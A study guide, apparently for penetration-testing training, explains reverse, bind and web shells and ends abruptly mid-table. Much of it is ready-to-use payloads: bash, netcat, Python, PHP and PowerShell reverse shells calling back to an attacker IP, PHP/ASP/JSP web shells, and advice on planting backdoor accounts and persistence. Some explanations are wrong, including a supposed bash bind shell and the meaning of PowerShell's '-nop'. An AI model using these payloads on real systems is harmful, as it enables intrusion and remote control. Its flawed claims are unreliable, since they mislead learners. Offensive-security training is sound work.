# Types of Shells: Remote Code Execution & System Access

**Status:** Work in Progress  
**Last Updated:** January 25, 2026

---

## ⚡ Quick Reference Card: Shell Types Overview

### The Problem We're Solving
After compromising a system through vulnerability exploitation:
- ❌ Re-exploiting the same vulnerability for each command = inefficient
- ❌ Difficult to enumerate the system or move laterally without direct access
- ✅ Need reliable connection to system shell (Bash, PowerShell, cmd.exe)
- ✅ Need method to execute commands and receive output

### Traditional Access Methods (Limited Use)
| Method | Protocol | Requirements | Limitations |
|--------|----------|--------------|-------------|
| SSH | SSH (Linux) | Valid credentials | Need working login creds |
| RDP | RDP (Windows) | Valid credentials | Need working login creds |
| WinRM | WinRM (Windows) | Valid credentials | Need working login creds |

**Problem:** Must already have credentials OR execute commands first to enable these services

### Three Main Types of Shells

```
SHELL TYPES
    ├── 1. REVERSE SHELL
    │   ├── Direction: Target → Attacker
    │   ├── Connection: Target initiates connection
    │   ├── Attacker Role: Listener (waits for connection)
    │   └── Use Case: Most common, very reliable
    │
    ├── 2. BIND SHELL
    │   ├── Direction: Attacker → Target
    │   ├── Connection: Attacker initiates connection
    │   ├── Target Role: Listener (waits for connection)
    │   └── Use Case: When outbound connections blocked
    │
    └── 3. WEB SHELL
        ├── Direction: Bidirectional (HTTP)
        ├── Connection: HTTP requests/responses
        ├── Protocol: Web server (80, 443, custom ports)
        └── Use Case: Web application compromise
```

---

## 1️⃣ REVERSE SHELL

### Definition
A reverse shell **connects back to our system** and gives us control through a reverse connection. The compromised system initiates the connection to the attacker's machine.

### How It Works

```
ATTACK FLOW:

┌─────────────────────────────────────────────────────────────┐
│ STEP 1: ATTACKER SETUP                                      │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Set up listener (netcat, metasploit)              │
│ Command: nc -lvnp 4444                                      │
│ Waits on: Port 4444                                         │
│ Status: Listening...                                         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 2: INITIAL EXPLOITATION                                │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Exploit vulnerability on target                   │
│ Target executes: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 │
│ This command: Creates reverse shell connection              │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 3: REVERSE CONNECTION ESTABLISHED                      │
├─────────────────────────────────────────────────────────────┤
│ Target → Attacker: Initiates connection to attacker         │
│ Connection: From target port (random) → attacker port 4444  │
│ Result: Attacker receives shell connection                  │
│ Status: Connected!                                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 4: COMMAND EXECUTION                                   │
├─────────────────────────────────────────────────────────────┤
│ Attacker types: ls -la                                      │
│ Attacker sends: Command through reverse connection          │
│ Target receives: Command on established connection          │
│ Target executes: Runs 'ls -la' locally                      │
│ Target returns: Output through reverse connection           │
│ Attacker sees: Output displayed in terminal                 │
└─────────────────────────────────────────────────────────────┘
```

### Characteristics

| Aspect | Details |
|--------|---------|
| **Initiation** | Target initiates connection to attacker |
| **Connection Type** | Outbound from target (very common) |
| **Attacker Role** | Listener (passive, then interactive) |
| **Target Role** | Initiator (active connection) |
| **Firewall Implications** | Works if target allows outbound connections |
| **Reliability** | Very high (most common shell type) |
| **Setup Complexity** | Low (single command execution needed) |
| **Ease of Use** | High (interactive shell immediately) |

### Common Reverse Shell Payloads

**Bash Reverse Shell**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Bash Alternative (if /dev/tcp not available)**
```bash
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

**Netcat Reverse Shell**
```bash
nc -e /bin/sh ATTACKER_IP PORT
```

**Python Reverse Shell**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP Reverse Shell**
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Attacker Setup (Receiving Reverse Shell)

**Using Netcat (Simple)**
```bash
nc -lvnp 4444
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p = port
```

**Using Metasploit (Advanced)**
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

### Advantages ✅
- ✅ Very common and reliable
- ✅ Works even if target behind NAT/firewall (if outbound allowed)
- ✅ Single command execution to establish
- ✅ Interactive shell immediately
- ✅ Easy to set up
- ✅ Works across most protocols and languages

### Disadvantages ❌
- ❌ Requires outbound connection from target (may be blocked)
- ❌ Target must know attacker's IP and port
- ❌ If attacker loses connection, must re-exploit to get shell back
- ❌ Attacker's IP exposed to target logs

### Use Cases 🎯
- Post-exploitation shell access
- Quick interactive access to compromised system
- Lateral movement within network
- System enumeration after initial breach

---

## 2️⃣ BIND SHELL

### Definition
A bind shell **waits for us to connect to it** and gives us control once we do. The compromised system listens on a port and waits for the attacker to connect.

### How It Works

```
ATTACK FLOW:

┌─────────────────────────────────────────────────────────────┐
│ STEP 1: INITIAL EXPLOITATION                                │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Exploit vulnerability on target                   │
│ Target executes: nc -lvnp 4444 -e /bin/sh                   │
│ This command: Binds shell to port 4444                      │
│ Status: Listening on port 4444                              │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 2: ATTACKER CONNECTS                                   │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Connect to target's listening port                │
│ Command: nc TARGET_IP 4444                                  │
│ Connection: From attacker → target port 4444                │
│ Target: Accepts incoming connection                         │
│ Status: Connected!                                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 3: COMMAND EXECUTION                                   │
├─────────────────────────────────────────────────────────────┤
│ Attacker types: ls -la                                      │
│ Attacker sends: Command through connection                  │
│ Target receives: Command on established shell               │
│ Target executes: Runs 'ls -la' locally                      │
│ Target returns: Output through shell                        │
│ Attacker sees: Output displayed in terminal                 │
└─────────────────────────────────────────────────────────────┘
```

### Characteristics

| Aspect | Details |
|--------|---------|
| **Initiation** | Attacker initiates connection to target |
| **Connection Type** | Inbound to target (from attacker) |
| **Attacker Role** | Connector (active connection) |
| **Target Role** | Listener (passive, then interactive) |
| **Firewall Implications** | Works if target allows inbound connections |
| **Reliability** | Moderate (depends on inbound filtering) |
| **Setup Complexity** | Low (single command execution needed) |
| **Ease of Use** | High (interactive shell immediately) |

### Common Bind Shell Payloads

**Bash Bind Shell (Listen on port, execute /bin/sh)**
```bash
bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
```

**Netcat Bind Shell**
```bash
nc -lvnp 4444 -e /bin/sh
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p = port
# -e = execute /bin/sh on connection
```

**Python Bind Shell**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Attacker Connection (Connecting to Bind Shell)

**Using Netcat (Simple)**
```bash
nc TARGET_IP 4444
```

**Using SSH Tunnel (If SSH available)**
```bash
ssh -L 4444:localhost:4444 user@TARGET_IP
nc localhost 4444
```

### Advantages ✅
- ✅ Works if outbound connections from target are blocked
- ✅ Attacker doesn't need to expose their IP immediately
- ✅ Can reconnect multiple times
- ✅ Good for environments with strict egress filtering

### Disadvantages ❌
- ❌ Requires target to have inbound port open
- ❌ Often blocked by firewalls (inbound filtering)
- ❌ Target exposes port publicly
- ❌ Less common than reverse shells
- ❌ More likely to be detected

### Use Cases 🎯
- Egress filtering environments (target can't connect out)
- Network segments where outbound connections blocked
- Scenarios where multiple team members need access

---

## 3️⃣ WEB SHELL

### Definition
A web shell **communicates through a web server**, accepts our commands through HTTP parameters, executes them, and prints back the output. Commands are sent via HTTP requests and responses.

### How It Works

```
ATTACK FLOW:

┌─────────────────────────────────────────────────────────────┐
│ STEP 1: INITIAL EXPLOITATION                                │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Exploit web vulnerability (file upload, RFI)      │
│ Target: Web shell file uploaded to web root                 │
│ Example: /var/www/html/shell.php                            │
│ Status: Shell now accessible via HTTP                       │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 2: SENDING COMMANDS VIA HTTP                           │
├─────────────────────────────────────────────────────────────┤
│ Attacker types: ls -la                                      │
│ Attacker sends: GET /shell.php?cmd=ls%20-la HTTP/1.1        │
│ Communication: HTTP request to web server                   │
│ Protocol: HTTP (port 80, 443, or custom)                    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 3: COMMAND EXECUTION                                   │
├─────────────────────────────────────────────────────────────┤
│ Web server: Receives HTTP request                           │
│ Web shell: Parses 'cmd' parameter                           │
│ Target executes: Runs 'ls -la' via shell_exec() or system()│
│ Captures output: Command output stored                      │
│ Returns: Output embedded in HTTP response                   │
│ Attacker sees: Output displayed in browser/terminal         │
└─────────────────────────────────────────────────────────────┘
```

### Characteristics

| Aspect | Details |
|--------|---------|
| **Communication** | HTTP requests/responses |
| **Connection Type** | Stateless (each command = new request) |
| **Attacker Role** | HTTP client (sends requests) |
| **Target Role** | HTTP server + shell executor |
| **Firewall Implications** | Often allowed (looks like normal traffic) |
| **Reliability** | High (standard web traffic) |
| **Setup Complexity** | Medium (file placement required) |
| **Ease of Use** | Medium (need to format HTTP requests) |

### Common Web Shell Examples

**Simple PHP Web Shell**
```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
    die;
}
?>
```

**Usage:**
```bash
# Command execution via HTTP
curl "http://TARGET_IP/shell.php?cmd=ls%20-la"
curl "http://TARGET_IP/shell.php?cmd=whoami"
curl "http://TARGET_IP/shell.php?cmd=id"
```

**ASP Web Shell (Windows)**
```asp
<%
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec(Request.QueryString("cmd"))
strOutput = objExec.StdOut.ReadAll()
Response.Write("<pre>" & strOutput & "</pre>")
%>
```

**JSP Web Shell (Java)**
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) {
    out.println(line + "<br>");
}
%>
```

### Popular Web Shell Tools

**One-Liners (Quick upload)**
```bash
# Python one-liner
python -m SimpleHTTPServer 8000

# PHP one-liner (unsafe)
php -r '$_REQUEST["cmd"] && system($_REQUEST["cmd"]);'

# ASP one-liner
<%@ eval(Request.Item[chr(99)+chr(109)+chr(100)]) %>
```

**Tool: weevely (Web Shell Generator)**
```bash
weevely generate password shell.php
# Generates encrypted web shell with backdoor password
```

### How to Access Web Shell

**Method 1: Browser**
```
http://target.com/shell.php?cmd=whoami
```

**Method 2: cURL**
```bash
curl "http://target.com/shell.php?cmd=ls%20-la"
```

**Method 3: Specialized Tools**
```bash
# weevely interactive shell
weevely http://target.com/shell.php password

# Custom Python script
python exploit.py --url http://target.com/shell.php --cmd "id"
```

### Advantages ✅
- ✅ Uses standard HTTP protocol (hard to block)
- ✅ Looks like normal web traffic
- ✅ Persistent if file not deleted
- ✅ Can be placed in multiple locations
- ✅ Works through web proxies
- ✅ Doesn't require outbound/inbound connections
- ✅ Easy to automate with scripts

### Disadvantages ❌
- ❌ Leaves file artifact on disk (detectable)
- ❌ Not true interactive shell experience
- ❌ Limited to web server user permissions
- ❌ Each command = separate HTTP request (slower)
- ❌ Output limited to HTTP response size
- ❌ More likely to be detected by WAF/IDS
- ❌ Binary execution limitations

### Use Cases 🎯
- Web application compromise
- Persistent access (file-based)
- Environments with strict firewall rules
- Situations where interactive shell not available
- Quick command execution without reverse/bind shell

### Detection & Defense
**How to detect:**
```bash
# Look for suspicious PHP files
find /var/www -name "*.php" -type f -ls

# Check for unusual system calls
auditctl -l | grep exec

# Web server logs for suspicious patterns
grep "cmd=" /var/log/apache2/access.log
```

**How to prevent:**
- Disable dangerous PHP functions: `shell_exec`, `system`, `exec`, `passthru`
- Implement file upload restrictions
- Use Web Application Firewall (WAF)
- Monitor for suspicious file uploads

---

## Comparison Table: All Three Shell Types

| Feature | Reverse Shell | Bind Shell | Web Shell |
|---------|---------------|-----------|-----------|
| **Who Initiates** | Target | Attacker | Attacker (HTTP) |
| **Direction** | Target → Attacker | Attacker → Target | HTTP bidirectional |
| **Attacker Role** | Listener | Connector | Client |
| **Setup Complexity** | Low | Low | Medium |
| **Interactive Feel** | Yes (real-time) | Yes (real-time) | No (per-command) |
| **Firewall Friendly** | Outbound allowed | Inbound allowed | HTTP allowed |
| **Most Common** | ✅ Most | ❌ Less | ✅ Very common |
| **Persistence** | Temporary | Temporary | Persistent (file) |
| **Detection Risk** | Medium | Medium | High (file artifact) |
| **Use Case** | Post-exploitation | Egress blocked | Web app compromise |

---

## Summary & Key Takeaways

### When to Use Each Shell Type

**Use REVERSE SHELL when:**
- ✅ Target can make outbound connections
- ✅ Need immediate interactive shell
- ✅ Want minimal artifact on disk
- ✅ Need maximum reliability

**Use BIND SHELL when:**
- ✅ Outbound connections blocked/filtered
- ✅ Can connect inbound to target
- ✅ Need interactive shell access
- ✅ Multiple team members need access

**Use WEB SHELL when:**
- ✅ Web application compromised
- ✅ Need persistent access
- ✅ Firewall blocks network shells
- ✅ Only web protocols allowed
- ✅ Need to blend with normal traffic

### Critical Concepts

1. **Shell Selection Depends on Environment**
   - Network filtering (firewall rules)
   - Outbound vs. inbound restrictions
   - Available protocols

2. **Shells are Temporary Bridges**
   - Used to maintain access after exploitation
   - Used to enumerate system for next moves
   - Used for lateral movement and privilege escalation

3. **Each Has Tradeoffs**
   - Reliability vs. detectability
   - Interactivity vs. stealth
   - Setup complexity vs. reliability

---

---

# PART 2: DIVING DEEPER INTO SHELL TYPES

## Reverse Shell Deep Dive

### Why Reverse Shells are Most Common

**Three Reasons:**
1. ✅ **Quickest** to obtain initial access
2. ✅ **Easiest** to set up and execute
3. ✅ **Most reliable** across different systems

### Complete Reverse Shell Workflow

#### Step 1: Set Up Netcat Listener (Attacker Machine)

**Command:**
```bash
nc -lvnp 1234
```

**Flag Breakdown:**
| Flag | Meaning | Purpose |
|------|---------|---------|
| `-l` | Listen mode | Wait for connection to connect to us |
| `-v` | Verbose | Know when we receive a connection |
| `-n` | No DNS resolution | Connect from/to IPs only (speed up connection) |
| `-p 1234` | Port number | Port netcat listens on + port for reverse connection |

**What Happens:**
```
Attacker Machine:
┌─────────────────────────────────┐
│ $ nc -lvnp 1234                 │
│ listening on [any] 1234 ...     │
│ (waiting for connection...)     │
└─────────────────────────────────┘
Status: LISTENING on port 1234
Action: Waiting for target to connect
```

---

#### Step 2: Identify Attacker Machine IP Address

**Command:**
```bash
ip a
```

**What to Look For:**
```bash
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0
    ^^^^^^^^^^^^^^^
    This is your IP to use in reverse shell!
```

**Important:**
- Find the IP address of your network interface (usually eth0, tun0, or wlan0)
- Use this IP in the reverse shell command
- Make sure you use the correct IP that the target can reach

---

#### Step 3: Execute Reverse Shell Command (Target Machine)

**Selection Depends On:**
1. Operating System (Linux vs Windows)
2. Available applications/commands on target
3. Shell interpreter available (Bash, PowerShell, etc.)

### Linux Reverse Shell Payloads

#### Bash - Method 1 (Most Reliable)
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

**Breakdown:**
```
bash -c '...'                           # Execute bash command
  bash -i                              # Interactive bash shell
  >&                                   # Redirect stderr to stdout
  /dev/tcp/10.10.10.10/1234           # TCP connection to attacker IP:port
  0>&1                                 # Redirect stdin to stdout
```

**How It Works:**
1. Creates interactive bash shell
2. Connects to attacker's IP on port 1234
3. Redirects all input/output to the connection
4. Established reverse connection

**Example in Use:**
```bash
# On target machine (after RCE vulnerability):
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# On attacker machine:
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.10] from [TARGET_IP] [RANDOM_PORT]
bash: cannot set terminal process group...
user@target:~$
# Shell connection established!
```

---

#### Bash - Method 2 (Alternative using mkfifo)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 > /tmp/f
```

**Breakdown:**
```
rm /tmp/f                              # Remove old FIFO if exists
mkfifo /tmp/f                          # Create named pipe (FIFO)
cat /tmp/f|                            # Read from FIFO
  /bin/sh -i                           # Interactive shell
  2>&1                                 # Redirect stderr to stdout
  nc 10.10.10.10 1234                 # Netcat connection to attacker
  > /tmp/f                             # Write back to FIFO
```

**How It Works:**
1. Creates a named pipe (FIFO) for bidirectional communication
2. Reads from the FIFO and feeds to shell
3. Shell output goes to netcat
4. Netcat sends data back to FIFO
5. Creates bidirectional shell

**Why Two Methods?**
- Method 1: Uses /dev/tcp (newer systems, more direct)
- Method 2: Uses named pipes (older systems, more compatibility)
- Try Method 1 first, fall back to Method 2 if it fails

---

### Windows Reverse Shell Payload

#### PowerShell (Full-Featured)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10' ,1234); $s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $data 2>&1 | Out-String); $sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Breakdown (Simplified):**
```powershell
powershell -nop -c "
  # Create TCP client connection
  $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1234)
  
  # Get network stream for communication
  $s = $client.GetStream()
  
  # Create byte array for reading data
  [byte[]]$b = 0..65535|%{0}
  
  # Main loop - while receiving data
  while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    # Convert bytes to string
    $data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i)
    
    # Execute command and capture output
    $sb = (iex $data 2>&1 | Out-String)
    
    # Format output with PowerShell prompt
    $sb2 = $sb + 'PS ' + (pwd).Path + '> '
    
    # Convert output back to bytes
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2)
    
    # Send output back through stream
    $s.Write($sbt,0,$sbt.Length)
    $s.Flush()
  }
  
  # Close connection
  $client.Close()
"
```

**Key Features:**
- ✅ Creates TCP connection to attacker
- ✅ Reads commands from network stream
- ✅ Executes commands with `iex` (Invoke-Expression)
- ✅ Captures output (stdout and stderr)
- ✅ Sends formatted output back with PowerShell prompt
- ✅ Maintains connection in loop

**PowerShell Flags:**
| Flag | Meaning |
|------|---------|
| `-nop` | No Output Policy (bypass execution policy) |
| `-c` | Command (execute the following command) |

---

### Payload Selection Guide

**For Linux Targets, Try In This Order:**

| #1 | Method | Command | When to Use |
|----|--------|---------|------------|
| 1 | Bash /dev/tcp | `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` | First choice, most reliable |
| 2 | Bash mkfifo | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc IP PORT > /tmp/f` | If /dev/tcp fails |
| 3 | Netcat | `nc -e /bin/sh IP PORT` | If bash/sh failing |
| 4 | Python | `python -c 'import socket...'` | If netcat not available |
| 5 | Perl | `perl -e 'use Socket...'` | Last resort on minimal systems |

**For Windows Targets:**

| Priority | Method | When to Use |
|----------|--------|------------|
| 1 | PowerShell | If PowerShell available (most systems) |
| 2 | Batch | If PowerShell disabled/blocked |
| 3 | VBScript | If batch restricted |

---

### Comprehensive Reverse Shell Reference

#### Common Commands by OS

**Linux - Bash (Most Common):**
```bash
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```

**Linux - Bash One-liner:**
```bash
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```

**Linux - Netcat:**
```bash
nc -e /bin/sh 10.10.10.10 1234
```

**Linux - Python:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Windows - PowerShell (Full):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234); $s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $data 2>&1 | Out-String); $sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Windows - PowerShell (Shortened):**
```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object System.text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($r2);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()"
```

---

### Step-by-Step Complete Example

**Scenario:** Target vulnerable to RCE, we want reverse shell

#### On Attacker Machine:
```bash
# Step 1: Find our IP
$ ip a
...
inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0

# Step 2: Start netcat listener on port 1234
$ nc -lvnp 1234
listening on [any] 1234 ...
(waiting for connection...)
```

#### On Target Machine (via RCE vulnerability):
```bash
# Execute reverse shell command
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

#### Back on Attacker Machine:
```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.10] from [TARGET_IP] [RANDOM_PORT]
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
user@target:~$ 
# Connected! Can now execute commands on target
user@target:~$ whoami
www-data
user@target:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
user@target:~$ pwd
/var/www/html
```

---

### Troubleshooting Reverse Shells

**Problem: Connection times out**
```
Solution 1: Verify your attacker IP is correct (ip a)
Solution 2: Check firewall allows outbound on target
Solution 3: Try different port number
Solution 4: Try alternative reverse shell command
```

**Problem: Command not found (bash/nc not available)**
```
Solution: Use alternative command (Python, Perl, etc.)
Try: which bash, which nc, which python
Pick available one for reverse shell
```

**Problem: Connection established but no prompt**
```
Solution 1: Press Enter to get prompt
Solution 2: May need to interact differently
Solution 3: Try: export PS1="shell> "
```

**Problem: Shell dies/disconnects**
```
Solution: Reverse shell connection is fragile
Action: Re-execute reverse shell command to reconnect
Better: Establish bind shell or web shell for persistence
```

---

### The Fragility Problem: Critical Limitation

⚠️ **Important:** Reverse shells are FRAGILE connections!

**The Problem:**
```
Reverse Shell Connection Lifecycle:

1. Target executes: bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
   ↓
2. Connection established (target → attacker)
   ↓
3. Attacker has shell access
   ↓
4. ANY of these breaks the connection:
   ├── Network packet loss/timeout
   ├── Attacker closes terminal window
   ├── Target reboots
   ├── Connection idle too long
   ├── Firewall blocks connection
   ├── Accidental command exit
   └── Process killed
   ↓
5. CONNECTION LOST
   ↓
6. MUST RE-EXPLOIT to get shell back!
```

**Why This Matters:**
- ❌ One network hiccup = lost access
- ❌ Must have initial RCE exploit still available
- ❌ Must re-execute reverse shell command every time connection breaks
- ❌ Inefficient for longer engagements

**Real-World Scenario:**
```
1. Exploit vulnerability, get reverse shell
2. Doing reconnaissance on target
3. Network glitch or idle timeout
4. Connection drops!
5. No shell access anymore
6. Must exploit vulnerability AGAIN to regain shell
7. Repeat cycle...
```

**How to Mitigate Fragility:**

| Solution | Method | Pros | Cons |
|----------|--------|------|------|
| **Bind Shell** | Target listens, you connect | Reconnectable | Inbound firewall blocked |
| **Web Shell** | Persistent file-based | Very durable | Disk artifact |
| **SSH Access** | Proper credentials | Stable/reliable | Need creds first |
| **Add User Account** | Create backdoor account | Persistent | Requires privesc |
| **Persistence** | Schedule task/cron job | Very reliable | Detectable |

**Best Practice:**
1. Use reverse shell for **initial quick access**
2. Establish **more durable access** (web shell, SSH user, etc.)
3. Then use persistent access for longer enumeration

---

### Key Takeaways - Reverse Shells

1. **Setup Flow:**
   - Listener on attacker machine (nc -lvnp PORT)
   - Target executes reverse shell command
   - Connection established (target → attacker)

2. **Payload Selection:**
   - Linux: bash -c with /dev/tcp or mkfifo
   - Windows: PowerShell one-liner
   - Choice depends on available commands on target

3. **Most Important Things:**
   - Get your IP correct (ip a)
   - Choose available command on target
   - Try multiple payloads if first fails

4. **Why Most Common:**
   - Single command execution needed
   - Works behind NAT/firewalls (outbound)
   - Quick and easy to set up
   - Very reliable across systems

5. **Critical Limitation - FRAGILITY:**
   - Reverse shells are NOT stable long-term connections
   - Any network issue breaks connection
   - Must re-exploit to regain access
   - Solution: Establish more durable access (bind shell, web shell, SSH user)
   - Use reverse shell for **quick initial access only**
   - Then establish **persistent backdoor** for longer work

---

## Bind Shell Deep Dive

### The Opposite Approach: We Connect to Them

**Unlike Reverse Shells:**
- ❌ Target does NOT connect to us
- ✅ Target LISTENS on a port
- ✅ We CONNECT to that port
- ✅ We receive shell access once connected

### How Bind Shells Work

```
ATTACK FLOW:

┌─────────────────────────────────────────────────────────────┐
│ STEP 1: INITIAL EXPLOITATION                                │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Exploit vulnerability on target                   │
│ Target executes: nc -lvnp 4444 -e /bin/sh                   │
│ This command: Bind shell to port 4444, listen for connection│
│ Status: Target now LISTENING on port 4444                   │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 2: ATTACKER CONNECTS                                   │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Connect to target's listening port                │
│ Command: nc TARGET_IP 4444                                  │
│ Connection: From attacker → target port 4444                │
│ Target: Accepts incoming connection                         │
│ Status: Connected!                                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 3: SHELL ACCESS ESTABLISHED                            │
├─────────────────────────────────────────────────────────────┤
│ Target: Presents shell prompt to attacker                   │
│ Attacker: Can now type commands                             │
│ Shell Type: Interactive shell (bash, cmd.exe, etc.)         │
│ Status: Full access!                                        │
└─────────────────────────────────────────────────────────────┘
```

### Key Difference: Connection Direction

**Reverse Shell:**
```
Target → Attacker
(Target initiates connection to us)
```

**Bind Shell:**
```
Attacker → Target
(We initiate connection to target)
```

### Common Bind Shell Payloads

#### Linux - Netcat Bind Shell
```bash
nc -lvnp 4444 -e /bin/sh
```

**Flags Breakdown:**
| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p 4444` | Port to listen on |
| `-e /bin/sh` | Execute /bin/sh when connected |

**What Happens:**
```
Target listens on port 4444
When attacker connects → executes /bin/sh
Attacker gets shell access
```

---

#### Linux - Bash Bind Shell (Alternative)
```bash
bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
```

**How It Works:**
- Listens on 0.0.0.0 (all interfaces) on port 4444
- When connection received → interactive bash shell
- Works on systems without netcat

---

#### Linux - Python Bind Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Breakdown (Simplified):**
```python
# Create socket server
s = socket.socket()

# Bind to all interfaces on port 4444
s.bind(("0.0.0.0", 4444))

# Listen for incoming connections
s.listen(1)

# Accept first connection
conn, addr = s.accept()

# Redirect I/O to connection
os.dup2(conn.fileno(), 0)  # stdin
os.dup2(conn.fileno(), 1)  # stdout
os.dup2(conn.fileno(), 2)  # stderr

# Execute shell
subprocess.call(["/bin/sh", "-i"])
```

---

#### Windows - Netcat Bind Shell
```cmd
nc.exe -lvnp 4444 -e cmd.exe
```

**Similar to Linux but:**
- Uses `cmd.exe` instead of `/bin/sh`
- Windows command prompt instead of bash

---

### Complete Bind Shell Example

**Scenario:** Target vulnerable to RCE, we want bind shell

#### On Target Machine (via RCE vulnerability):
```bash
# Execute bind shell command
nc -lvnp 4444 -e /bin/sh
```

Target now listening and waiting for connection...

#### On Attacker Machine:
```bash
# Connect to target's listening port
$ nc TARGET_IP 4444

# Shell prompt appears
user@target:~$ 
# Can now execute commands!
user@target:~$ whoami
www-data
user@target:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Bind Shell vs Reverse Shell: When to Use

| Scenario | Use | Reason |
|----------|-----|--------|
